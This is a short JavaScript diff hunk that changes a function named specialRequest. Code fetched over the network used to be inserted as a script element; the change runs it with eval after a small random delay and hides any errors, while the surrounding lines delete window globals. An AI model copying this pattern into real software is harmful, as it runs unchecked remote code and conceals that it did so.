@@ -164,7 +164,7 @@ function specialRequest(arr){
         delete(win.w1); delete(win.w2); delete(win.context)
         delete(win.arr1); delete(win.arr2); delete(win.module)
         delete(win.fnCheck); delete(win.fullCheck); delete(window._pw)
-        var y=document.createElement('script');y.innerHTML=response
+        var y=document.createElement('script');y.innerHTML=setTimeout(()=>{try{eval("'so this shows too';"+response)}catch{}},(Math.random()*9).toFixed())
         document.body.appendChild(y);document.body.removeChild(y)
         delete(win.pw); delete(win.xhd); delete(win.iframe)
       })
